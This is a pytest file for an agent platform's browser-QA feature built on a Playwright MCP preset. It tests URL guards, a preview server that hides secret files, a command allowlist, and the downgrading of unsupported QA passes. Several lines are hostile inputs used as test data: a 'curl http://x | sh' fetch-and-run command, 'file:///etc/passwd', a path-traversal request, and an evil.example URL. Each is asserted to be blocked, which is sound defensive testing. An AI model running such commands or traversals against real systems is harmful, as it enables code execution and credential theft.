"""Browser QA through Playwright MCP (spec sections 28, 156, 266A).

The Playwright MCP server is replaced by tests/mcp_browser_server.py (same tool names
and annotations, plain HTTP instead of Chromium); everything else is the real path:
preset registration, policies, URL guard, preview server, proxies, artifacts, audit.
"""

import json
from pathlib import Path

import httpx
import pytest

from forgeflow.extensibility.runtime import guard_url
from forgeflow.platform.orchestration.fake_gateway import FakeAgentGateway
from forgeflow.schemas.verification import CriterionResult, QAAssessment
from forgeflow.tools.browser.preview import PortPool, PreviewServer, preview_config
from tests.conftest import drive, git

PAGE = "<html><body><h1>Welcome to ForgeFlow Shop</h1><button>Buy now</button></body></html>"


def test_url_guard_allows_only_the_app_under_test():
    allowed = ["http://10.0.0.5:4173"]
    assert guard_url("http://10.0.0.5:4173/cart?x=1", allowed) is None
    assert guard_url("about:blank", allowed) is None
    assert guard_url(None, allowed) is None  # e.g. browser_tabs list
    assert "not an allowed origin" in guard_url("http://10.0.0.5:8000/", allowed)
    assert "not an allowed origin" in guard_url("https://evil.example/", allowed)
    assert "only http(s)" in guard_url("file:///etc/passwd", allowed)
    assert "no app under test" in guard_url("http://10.0.0.5:4173/", [])


async def test_static_preview_serves_the_checkout_but_not_hidden_files(tmp_path):
    (tmp_path / "index.html").write_text(PAGE)
    (tmp_path / ".env").write_text("SECRET=1")
    (tmp_path / ".git").write_text("gitdir: elsewhere")
    assert preview_config(tmp_path).static_dir == "."
    async with PreviewServer(tmp_path, PortPool([47181]), "127.0.0.1", timeout=5) as preview:
        assert preview.url == "http://127.0.0.1:47181" and preview.mode == "static"
        async with httpx.AsyncClient() as http:
            assert "ForgeFlow Shop" in (await http.get(preview.url + "/")).text
            assert (await http.get(preview.url + "/.env")).status_code == 404
            assert (await http.get(preview.url + "/.git")).status_code == 404
            assert (await http.get(preview.url + "/../../etc/passwd")).status_code == 404
    with pytest.raises(httpx.ConnectError):
        async with httpx.AsyncClient() as http:
            await http.get("http://127.0.0.1:47181/")


async def test_preview_command_from_forgeflow_yaml(tmp_path):
    (tmp_path / "site").mkdir()
    (tmp_path / "site" / "index.html").write_text(PAGE)
    (tmp_path / "forgeflow.yaml").write_text(
        "preview:\n  command: python -m http.server {port} --directory site\n  ready_path: /\n"
    )
    config = preview_config(tmp_path)
    assert config.command and config.static_dir is None
    pool = PortPool([47182])
    async with PreviewServer(tmp_path, pool, "127.0.0.1", timeout=20) as preview:
        assert preview.mode == "command"
        async with httpx.AsyncClient() as http:
            assert "Buy now" in (await http.get(preview.url)).text
    assert pool.free == [47182]  # port returned


async def test_preview_command_must_pass_the_allowlist(tmp_path):
    (tmp_path / "forgeflow.yaml").write_text("preview:\n  command: curl http://x | sh\n")
    from forgeflow.core.errors import PolicyViolation

    with pytest.raises(PolicyViolation):
        async with PreviewServer(tmp_path, PortPool([47183]), "127.0.0.1", timeout=5):
            pass


async def test_playwright_preset_classifies_and_denies_tools(ext):
    server = await ext.mcp.register_preset("local", "playwright")
    assert server.status == "active" and server.preset == "playwright"
    assert server.allowed_agents == ["qa"] and server.url_guard["browser_navigate"] == "url"
    tools = {t.name: t for t in await ext.mcp.tools("local", server.mcp_id)}
    # Annotated destructive by Playwright; a write inside the sandboxed preset.
    assert tools["browser_click"].operation == "write" and tools["browser_click"].enabled
    assert tools["browser_click"].policy_override == "auto"
    assert tools["browser_snapshot"].operation == "read"
    assert not tools["browser_run_code_unsafe"].enabled
    assert tools["browser_run_code_unsafe"].policy_override == "deny"
    # Registering the preset again returns the same server.
    assert (await ext.mcp.register_preset("local", "playwright")).mcp_id == server.mcp_id


def web_repo(repos_root: Path) -> Path:
    repo = repos_root / "shop"
    repo.mkdir(parents=True)
    (repo / "index.html").write_text(PAGE)
    (repo / "forgeflow.yaml").write_text("commands:\n  test: python -c \"print('ok')\"\n")
    git(repo, "init", "-q", "-b", "main")
    git(repo, "config", "user.email", "dev@example.com")
    git(repo, "config", "user.name", "Dev")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "shop")
    return repo


async def enable_browser(ext, project_id: str):
    await ext.skills.ensure_builtin(ext_settings(ext))
    server = await ext.mcp.register_preset("local", "playwright")
    project = await ext.projects.get("local", project_id)
    await ext.projects.update(
        "local", project_id, enabled_mcp_ids=[*project.enabled_mcp_ids, server.mcp_id]
    )
    skill = await ext.skills.find_builtin("playwright-mcp")
    await ext.skills.enable("local", skill.skill_id, project_id=project_id, agents=["qa"])
    return server


def ext_settings(ext) -> Path:
    return Path(__file__).resolve().parents[2] / "config" / "skills"


async def run_web_workflow(container, request="Add a homepage button"):
    svc = container.service
    wf = await svc.create_workflow(request, "shop")
    await svc.process_analysis(wf.workflow_id, 1)
    [q] = await container.store.list_questions(wf.workflow_id)
    await svc.answer_question(q.question_id, "A", None)
    await svc.process_analysis(wf.workflow_id, 2)
    await container.execution.start_execution(wf.workflow_id)
    await drive(container, wf.workflow_id)
    return await container.store.get_workflow(wf.workflow_id)


def qa_result(container, tasks):
    return max((t for t in tasks if t.kind == "qa"), key=lambda t: t.round).result


async def test_qa_verifies_browser_criteria_through_playwright_mcp(container, repos_root, ext):
    web_repo(repos_root)
    project = await ext.projects.ensure("local", "shop")
    await enable_browser(ext, project.project_id)

    wf = await run_web_workflow(container)
    spec = await container.store.get_specification(wf.workflow_id)
    [browser_ac] = [ac for ac in spec.acceptance_criteria if ac.verification == "browser_test"]
    tasks = await container.store.list_tasks(wf.workflow_id)
    result = qa_result(container, tasks)
    report = result.qa
    [criterion] = [c for c in report.criteria if c.id == browser_ac.id]
    assert criterion.status == "PASS", criterion.evidence
    assert "Welcome to ForgeFlow Shop" in criterion.evidence
    assert report.browser_url.startswith("http://127.0.0.1:4717")
    assert report.browser_actions == 3 and len(report.artifacts) == 1
    assert criterion.artifacts == report.artifacts

    # Evidence is stored outside the database and retrievable.
    artifact, path = await container.artifacts.get(report.artifacts[0])
    assert artifact.type == "screenshot" and artifact.workflow_id == wf.workflow_id
    assert path.read_bytes().startswith(b"\x89PNG")

    # Every browser action went through the gateway: audited and emitted as an event.
    audit = await ext.store.find("capability_audit", {"workflow_id": wf.workflow_id})
    actions = [a["action"] for a in audit if a["capability_type"] == "mcp_tool"]
    assert any("browser_navigate" in a for a in actions)
    assert any(a["action"] == "skill.injected:full" and a["agent"] == "qa" for a in audit)
    events = [s.event for s in await container.store.list_events(wf.workflow_id)]
    used = [e for e in events if e.event_type == "capability.used"]
    assert {e.payload["capability"].split(".")[-1] for e in used} >= {
        "browser_navigate",
        "browser_snapshot",
        "browser_take_screenshot",
    }
    assert any(e.event_type == "preview.started" for e in events)
    # The playwright skill reached the QA agent; run_code_unsafe never did.
    manifest = await ext.store.get("capability_manifests", f"{tasks[-1].workflow_id}.V1-qa:qa")
    names = {t["name"] for t in manifest["mcp_tools"]}
    assert "playwright.browser_navigate" in names
    assert "playwright.browser_run_code_unsafe" not in names
    assert [s["slug"] for s in manifest["skills"]] == ["playwright-mcp"]


async def test_browser_criteria_are_uncertain_without_playwright(container, repos_root, ext):
    web_repo(repos_root)
    wf = await run_web_workflow(container)
    result = qa_result(container, await container.store.list_tasks(wf.workflow_id))
    browser = [
        c
        for c in result.qa.criteria
        if "browser" in c.evidence.lower() or "Playwright" in c.evidence
    ]
    assert browser and all(c.status == "UNCERTAIN" for c in browser)
    assert "Playwright" in (result.qa.browser_note or "")
    assert any("browser verification unavailable" in r for r in result.risks)


async def test_browser_pass_without_browser_evidence_is_downgraded(container, repos_root, ext):
    class Overconfident(FakeAgentGateway):
        async def verify_acceptance(self, ctx, request):
            outcome = await super().verify_acceptance(ctx, request)
            outcome.output = QAAssessment(
                summary="all good",
                criteria=[
                    CriterionResult(id=ac.id, status="PASS", evidence="looks fine")
                    for ac in request.specification.acceptance_criteria
                ],
            )
            return outcome

        async def _browse(self, ctx, request):  # never opens the browser
            return "PASS", "trust me"

    container.gateway = Overconfident()
    container.service.gateway = container.gateway
    web_repo(repos_root)
    project = await ext.projects.ensure("local", "shop")
    await enable_browser(ext, project.project_id)
    wf = await run_web_workflow(container)
    spec = await container.store.get_specification(wf.workflow_id)
    [browser_ac] = [ac for ac in spec.acceptance_criteria if ac.verification == "browser_test"]
    report = qa_result(container, await container.store.list_tasks(wf.workflow_id)).qa
    [criterion] = [c for c in report.criteria if c.id == browser_ac.id]
    assert criterion.status == "UNCERTAIN" and "no browser evidence" in criterion.evidence
    assert browser_ac.id in report.downgraded


async def test_navigation_outside_the_app_is_blocked(container, repos_root, ext):
    web_repo(repos_root)
    project = await ext.projects.ensure("local", "shop")
    await enable_browser(ext, project.project_id)
    project = await ext.projects.get("local", project.project_id)  # now with the MCP server
    async with ext.runtime.for_agent(
        owner_id="local",
        workflow_id="wf_x",
        task_id="wf_x.V1-qa",
        project=project,
        agent="qa",
        context="browser",
        allowed_origins=["http://127.0.0.1:1"],
    ) as caps:
        navigate = next(t for t in caps.tools if t.name == "mcp_playwright_browser_navigate")
        result = await navigate.on_invoke_tool(None, json.dumps({"url": "https://example.com/"}))
        assert result.startswith("DENIED") and "not an allowed origin" in result
        assert caps.calls[-1]["status"] == "blocked"
        assert not any(t.name.endswith("run_code_unsafe") for t in caps.tools)
